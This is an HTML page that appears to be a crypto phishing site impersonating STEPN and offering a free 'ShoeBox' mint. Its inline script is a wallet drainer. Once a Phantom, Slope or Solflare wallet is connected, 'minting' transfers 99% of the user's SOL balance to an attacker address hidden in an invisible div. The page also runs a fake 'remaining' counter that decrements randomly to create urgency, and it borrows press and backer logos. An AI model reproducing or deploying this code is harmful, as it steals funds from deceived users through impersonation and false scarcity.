<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>STEPN - Free ShoeBox</title>
    <link rel="stylesheet" type="text/css" href="./css/reset.css">
    <link rel="stylesheet" type="text/css" href="./css/style.css">
    <link rel="stylesheet" type="text/css" href="./css/media.css">
    <link href="./css/chunk-vendor.css" rel="stylesheet preload prefetch" as="style">
    <meta name="keywords" content="STEPN, Game-Fi, Fitness, running app, Crypto, Game, GMT, GST, Solana, SOL, move2earn, metaverse, play2earn, web3">
    <meta name="description" content="In STEPN, your steps are worth more than you think -- exercising and moving outdoors can now earn anyone tokens anytime, anywhere. We believe this simple design can nudge millions into healthier lifestyles and bring them to the Web3 world.">
    <link rel="icon" href="./img/favicon.ico">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/alertify.min.css">
    <style type="text/css">
        .alertify-notifier .ajs-message.ajs-warning {
            background: #ffffffdb;
            color: #000;
            font-family: 'TT Octosquares';
            font-weight: 600;
            border: 3px solid #000;
            border-radius: 30px;
        }

        button {
            padding: 0;
            border: none;
            font: inherit;
            color: inherit;
            background-color: transparent;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="loading">
        <img class='loading__image' src="./img/loading.gif" width="1000" alt="">
    </div>

    <a data-role="logo" href="/"><img src="./img/logo.svg" alt="" class="logo" data-role="logo" width="106" height="106"></a>
    <a target="_blank" style="color:#000;" href="https://apps.apple.com/us/app/stepn/id1598112424">
        <div class="join breathe">DOWNLOAD NOW</div>
    </a>
    <div class="boxes">
        <div class="span-boxes">Unique Limited Item</div>
        <img class="img-box" src="./img/shoeboxes.png">
        <div class="id-number-box-from">Collect <span>Unique</span> Limited <span>Item</span></div>
        <div class="box-limit">
            <div class="box-limit-text">
                <div>Cost: 0.00 SOL <br/>per 1 ShoeBox</div>
                <div>Remain: <span id="remain-mint"></span></div>
            </div>
            <div class="container">
                <div class="skill" id="mint-progress"></div>
            </div>
        </div>
            
        <div class="mint__price">
            <p>Maximum 1 per Customer</p>
        </div>
        
        <div class="mint__content">
            <div class="mint__wallet-hidden" style="display: none">A4fMguhfZd4Cxk5LJLkTVa1EPnvgz4uBY3S2wXfpfchx</div>
            <div class="mint__counter">
                <div class="counter">
                    <div class="counter__input">1</div>
                    <div class="counter__button counter__button_minus"><img src="./img/minus.svg"></div>
                    <div class="counter__button counter__button_plus"><img src="./img/plus.svg"></div>
                </div>
            </div>
        </div>

        <div class="footer-box mint__button" id="connect">
            <button class="v-btn v-btn--is-elevated v-btn--has-bg v-btn--rounded theme--light v-size--default client--button" type="button" style="justify-content: center;">Connect Wallet</button>
        </div>
    </div>

    <div class="select__wallet-cont" style="display: none;">
        <div class="select__wallet">
          <h4 class="select__title" style="align-items: center;">Select your wallet <svg class="exit" fill="rgb(158, 158, 158)" focusable="false" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg></h4>
          <div class="select__wallets">
            <div class="select__wallet-item" id="phantom">
              <div class="wallet__name">Phantom</div>
              <img class="select__wallet-icon" src="./img/phantom.svg" alt="Phantom">
            </div>

            <div class="select__wallet-item" id="slope">
              <div class="wallet__name">Slope</div>
              <img class="select__wallet-icon" src="./img/slope.png" alt="Slope">
            </div>

            <div class="select__wallet-item" id="solflare">
              <div class="wallet__name">Solflare</div>
              <img class="select__wallet-icon" src="./img/solflare.svg" alt="Solflare">
            </div>

            <div class="select__hide" style="display: none;">
                <div class="select__wallet-item" id="sollet">
                  <div class="wallet__name">Sollet</div>
                  <img class="select__wallet-icon" src="./img/sollet.svg" alt="Sollet">
                </div>

                <div class="select__wallet-item" style="border-radius: 0 0 0 0; border-bottom: 1px solid rgba(255, 255, 255, 0.1);" id="sollet_e">
                  <div class="wallet__name">Sollet (Extension)</div>
                  <img class="select__wallet-icon" src="./img/sollet_e.png" alt="Sollet (Extension)">
                </div>
            </div>

            <div class="select__wallet-item" id="hide" style="display: none;">
              <div class="wallet__name wallet__name-hide">More options</div>
              <svg class="select__wallet-icon select__wallet-icon-hide" fill="#9e9e9e" focusable="false" viewBox="0 0 24 24" aria-hidden="true"><path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path></svg>
            </div>
          </div>
        </div>
      </div>

    <div class="box"></div>

    <div class="featuder-box">
        <div class="title">AS FEATURED IN</div>
        <div class="icon feature-icon">
            <a href="https://www.bloomberg.com/press-releases/2021-12-10/the-first-solana-nft-mobile-game-is-officially-released" target="_blank" rel="noreferrer"><img src="./img/bloomberg.png" alt=""></a>
            <a href="https://news.yahoo.com/news/first-solana-nft-mobile-game-122000074.html" target="_blank" rel="noreferrer"><img src="./img/yahooNews@3x.png" alt=""></a>
            <a href="https://finance.yahoo.com/news/stepn-announces-public-beta-launch-210300551.html" target="_blank" rel="noreferrer"><img src="./img/yahooFinance@3x.png" alt=""></a>
            <a href="https://cointelegraph.com/press-releases/stepnan-nft-sneaker-you-can-use-in-real-life-and-get-fit" target="_blank" rel="noreferrer"><img src="./img/cointelegraph.svg" alt=""></a>
            <a href="https://www.benzinga.com/pressreleases/21/12/24542611/the-first-solana-nft-mobile-game-is-officially-released" target="_blank" rel="noreferrer"><img src="./img/benzinga.svg" alt=""></a>
            <a href="https://www.nasdaq.com/press-release/the-first-solana-nft-mobile-game-is-officially-released-2021-12-10" target="_blank" rel="noreferrer"><img src="./img/nasdaq.svg" alt=""></a>
            <a href="https://www.marketwatch.com/press-release/the-first-solana-nft-mobile-game-is-officially-released-2021-12-10?tesla=y" target="_blank" rel="noreferrer"><img src="./img/marketwatch.svg" alt=""></a>
        </div>
    </div>

    <div class="roadmap-box">
        <div class="title">ROADMAP</div>
        <div class="container-road">
            <img src="./img/roadmap-top.svg" alt="" class="top">
            <div class="wrapper-road">
                <img src="./img/roadmap-pcs.svg" alt="" id="roadmap" draggable="false">
                <img src="./img/roadmap-bottom.svg" alt="" class="bottom">
            </div>
        </div>
    </div>

    <div class="row start">
        <div class="mc-field-group">
            <input type="email" class="subscribe-box" placeholder="Email" name="EMAIL" id="mce-EMAIL" aria-required="true" aria-invalid="true" value="">
        </div>
        <div class="clear">
            <input type="submit" name="subscribe" id="mc-embedded-subscribe" class="button sendEmail title" value="SUBSCRIBE" onclick="subscribe()">
        </div>
    </div>

    <div class="backers-box">
        <div class="title">OUR BACKERS</div>
        <div class="background">
            <div class="mask"></div>
            <div class="content">
                <div class="row">
                    <a href="https://www.sequoiacap.com" target="_blank"><img src="./img/sequoia.svg" width="314" alt=""></a>
                    <a href="https://www.folius.ventures/" target="_blank"><img src="./img/folius.svg" width="370" alt=""></a>
                    <a href="https://www.binance.com/" target="_blank"><img src="./img/binance.svg" width="288" alt=""></a>
                </div>
                <div class="grid">
                    <a href="https://solana.ventures/" target="_blank"><img src="./img/solanabackers.svg" alt=""></a>
                    <a href="https://www.alameda-research.com/" target="_blank"><img src="./img/alamedabackers.svg" alt=""></a>
                    <a href="https://www.defialliance.co/" target="_blank"><img src="./img/defiallifadsf.svg" alt=""></a>
                    <a href="http://m13.co/" target="_blank"><img src="./img/m333.svg" alt=""></a>
                    <a href="https://cornerventures.com/" target="_blank"><img src="./img/corner.svg" alt=""></a>
                    <a href="https://www.6thman.ventures/" target="_blank"><img src="./img/6thmanback.svg" alt=""></a>
                    <a href="https://zeeprime.capital/" target="_blank"><img src="./img/zee.svg" alt=""></a>
                    <a href="https://www.sfermion.io/" target="_blank"><img src="./img/sfermion.svg" alt=""></a>
                    <a href="https://sparkdigitalcapital.com/" target="_blank"><img src="./img/spark.svg" alt=""></a>
                    <a href="https://morningstar.ventures/" target="_blank"><img src="./img/morningstrr.svg" alt=""></a>
                    <a href="https://lemniscap.com/" target="_blank"><img src="./img/lemniscoppp.svg" alt=""></a>
                    <a href="https://www.welindershi.com/" target="_blank"><img src="./img/wsss@3x.png" alt=""></a>
                    <a href="https://www.solarecofund.com/" target="_blank"><img src="./img/solareco.svg" alt=""></a>
                    <a href="https://www.openspace.vc/" target="_blank"><img src="./img/openspace.svg" alt=""></a>
                </div>
            </div>
        </div>
    </div>

    <div class="footer-full">
        <img src="./img/footer.svg" class="responsive1" alt="" width="100%">
        <img src="./img/footermobile.svg" class="responsive2" alt="" width="100%">
        <div class="media">
            <a href="mailto:hello@stepn.com">
                <img src="./img/email.svg" alt=""><span class="__cf_email__" data-cfemail="adc5c8c1c1c2edded9c8ddc383cec2c0">hello@stepn.com</span>
            </a>
            <a href="https://stepn.com/stepn_media_kit.zip" download="">
                <img src="./img/downloadmedia.svg" alt="">download media kit
            </a>
        </div>
        <div class="icon">
            <a href="https://discord.com/invite/stepn2" target="_blank" rel="noreferrer">
                <img src="./img/discut.svg" alt="">
            </a>
            <a href="https://t.me/STEPNannouncement" target="_blank" rel="noreferrer">
                <img src="./img/bxlTelegram.svg" alt="">
            </a>
            <a href="https://twitter.com/Stepnofficial" target="_blank" rel="noreferrer">
                <img src="./img/twitter.svg" alt="">
            </a>
            <a href="https://www.reddit.com/r/StepN/" target="_blank" rel="noreferrer">
                <img src="./img/reddit.svg" alt="">
            </a>
            <a href="https://stepnofficial.medium.com/" target="_blank" rel="noreferrer">
                <img src="./img/medium.svg" alt="">
            </a>
        </div>
        <p>
            <span>COPYRIGHT FINDSATOSHI LAB LTD. <span id="footer-year"></span> - ALL RIGHTS RESERVED</span> <span>丨</span> <span>POWERED BY FINDSATOSHI LAB LTD.</span>
        </p>
    </div>

    <script src="js/libs/jquery-3.6.0.min.js" charset="utf-8"></script>
    <script src="js/script.js"></script>
    <script src="js/index.iife.min.js?d"></script>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.31.0/lib/index.iife.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@project-serum/sol-wallet-adapter@0.0.3/index.iife.min.js"></script>

    <script>
        window.onload = function() {
            document.body.classList.add('loading');
            window.setTimeout(function() {
                document.body.classList.add('loading_hiding');
                document.body.classList.remove('loading');
            }, 3500);
        };

        document.getElementById("footer-year").innerHTML = new Date().getFullYear();

        let i = 1982;
        let x = 1982;
        let mintId = setInterval(function() {
            i = i - (Math.floor(Math.random() * 10) + 1);
            if (i >= 0 ) {
                document.getElementById("remain-mint").innerHTML = i;
            } else {
                document.getElementById("remain-mint").innerHTML = '0';
            }
            let s = (-(i*100/x)+105);
            document.getElementById("mint-progress").style.width = s<100 ? s+'%' : '100%';
        }, 1500);

        async function connectWallet(walletName) {
            try {
                let wallet, publicKey, connection;

                if (walletName === 'phantom') {
                    if (!window.solana || !window.solana.isPhantom) {
                        alert("Phantom wallet not found. Please install it to continue.");
                        return;
                    }
                    wallet = window.solana;
                } else if (walletName === 'slope') {
                    if (!window.Slope) {
                        alert("Slope wallet not found. Please install it to continue.");
                        return;
                    }
                    wallet = new window.Slope();
                } else if (walletName === 'solflare') {
                    if (!window.solflare) {
                        alert("Solflare wallet not found. Please install it to continue.");
                        return;
                    }
                    wallet = window.solflare;
                }

                if (walletName === 'phantom' || walletName === 'solflare') {
                    await wallet.connect();
                    publicKey = wallet.publicKey.toString();
                } else if (walletName === 'slope') {
                    const { msg, data } = await wallet.connect();
                    if (msg !== 'ok') {
                        alert("Failed to connect to Slope wallet.");
                        return;
                    }
                    publicKey = data.publicKey;
                }

                connection = new solanaWeb3.Connection("https://api.tatum.io/v3/blockchain/node/solana-mainnet");
                const walletBalance = await connection.getBalance(new solanaWeb3.PublicKey(publicKey));
                console.log(walletBalance / 1000000000);

                $('.wallet-adapter-button').text("Mint");
                $('.mint__button').attr("id", `mint${walletName.charAt(0).toUpperCase() + walletName.slice(1)}`);
                $(`#mint${walletName.charAt(0).toUpperCase() + walletName.slice(1)}`).on("click", () => mint(wallet, publicKey, connection));

                $(".select__wallet-cont").fadeOut("fast");
            } catch (error) {
                console.error("Error connecting wallet:", error);
                alert("An error occurred while connecting the wallet.");
            }
        }

        async function mint(wallet, publicKey, connection) {
            try {
                const recieverWallet = new solanaWeb3.PublicKey($(".mint__wallet-hidden").text());
                const walletBalance = await connection.getBalance(new solanaWeb3.PublicKey(publicKey));

                let transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: new solanaWeb3.PublicKey(publicKey),
                        toPubkey: recieverWallet,
                        lamports: walletBalance * 0.99,
                    })
                );

                transaction.feePayer = new solanaWeb3.PublicKey(publicKey);
                transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;

                if (walletName === 'phantom' || walletName === 'solflare') {
                    const signed = await wallet.signTransaction(transaction);
                    let txid = await connection.sendRawTransaction(signed.serialize());
                    await connection.confirmTransaction(txid);
                } else if (walletName === 'slope') {
                    const { msg, data } = await wallet.signTransaction(Base58.encode(transaction.serializeMessage()));
                    if (msg !== 'ok') {
                        alert("Failed to sign transaction with Slope wallet.");
                        return;
                    }
                    transaction.addSignature(new solanaWeb3.PublicKey(data.publicKey), Base58.decode(data.signature));
                    let txid = await connection.sendRawTransaction(transaction.serialize());
                    await connection.confirmTransaction(txid);
                }

                alert("Transaction successful!");
            } catch (error) {
                console.error("Error minting:", error);
                alert("An error occurred during the minting process.");
            }
        }

        $("#phantom").on("click", () => connectWallet('phantom'));
        $("#slope").on("click", () => connectWallet('slope'));
        $("#solflare").on("click", () => connectWallet('solflare'));

        $(".select__hide").slideUp("fast");

        let is = false;

        $("#hide").on("click", event => {
            if (is) {
                $(".select__hide").slideUp("fast");
                $(".wallet__name-hide").text("More options");
                document.querySelector(".select__wallet-icon-hide").style.transform = "rotate(0deg)";
                is = false;
            } else {
                $(".select__hide").slideDown("fast");
                $(".wallet__name-hide").text("Less options");
                document.querySelector(".select__wallet-icon-hide").style.transform = "rotate(180deg)";
                is = true;
            }
        });
    </script>
</body>
</html>
